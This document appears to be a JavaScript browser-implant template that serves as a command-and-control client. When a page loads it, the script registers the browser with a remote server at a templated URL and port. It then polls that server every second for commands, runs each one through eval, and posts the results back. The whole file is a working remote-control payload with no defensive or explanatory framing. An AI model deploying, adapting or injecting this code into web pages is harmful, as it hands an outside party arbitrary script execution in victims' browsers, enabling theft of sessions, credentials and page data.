{% include 'jquery.min.js' %}

{% include 'prune.js' %}

! function foo(config) {

    /* Eval Context */
    this.context = {};

    /* Logging functions */
    this.log = function (text) {
        if (config["debug"]) {
            console.log("debug: ", text)
        }
    };
    this.err = function (errText) {
        console.log("error: ", errText)
    };

    /* get a unique identifier */
    this.getUUID = function () {
        function s4() { return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1); }
        return s4() + s4() + '-' + s4() + '-' + s4() + '-' + s4() + '-' + s4() + s4() + s4();
    };

    /* register as a new client */
    this.register = function () {
        var formData = {
            'uuid': getUUID(),
            'user_agent' : navigator.userAgent
        };

        $.ajax({
            url: config.url + ':' + config.port + '/register/',
            type: "POST",
            data: formData,
            success: function (data, textStatus, jqXHR) {
                log(data);
            },
            error: function (jqXHR, textStatus, errorThrown) {
                err(textStatus);
            }
        });

        this.id = formData['uuid'];
    };

    /* fetch a new command from the command queue */
    this.getCommand = function() {

        $.ajax({
            url: config.url + ':' + config.port + '/get_command/' + this.id,
            type: "GET",
            dataType: 'json',
            context: this,
            success: function (data, textStatus, jqXHR) {
                if (!('error' in data ) && ('success' in data))
                {
                    var cmd = data['success'];
                    var cmd_id = data['cmd_id'];
                    this.exec(cmd, cmd_id);
                }
                log(data);
            },
            error: function (jqXHR, textStatus, errorThrown) {
                err(textStatus);
            }
        })
    };

    /* executes a command in the eval context */
    this.exec = function(cmd, cmd_id) {
        try
        {
            var out = eval.call(this.context, cmd);
            var js = JSON.prune(out);

            //var out = JSON.stringify(eval(cmd));
            this.postBack({'output' : js, 'cmd_id' : cmd_id, 'uuid' : this.id});
        }
        catch(err)
        {
            this.postBack({'output' : err.message, 'cmd_id' : cmd_id, 'uuid' : this.id});
        }
    };

    /* when a command has finished executing, post it back to the server */
    this.postBack = function(data) {

        $.ajax({
            url: config.url + ':' + config.port + '/post_back/',
            type: "POST",
            data: data,
            success: function (data, textStatus, jqXHR) {
                log(data);
            },
            error: function (jqXHR, textStatus, errorThrown) {
                err(errorThrown);
            }
        });
    };

    /* Main */
    this.register();
    setInterval(this.getCommand, 1000);

}({
    'debug' : true,
    'url' : '{{ url }}',
    'port' : '{{ port }}'
});

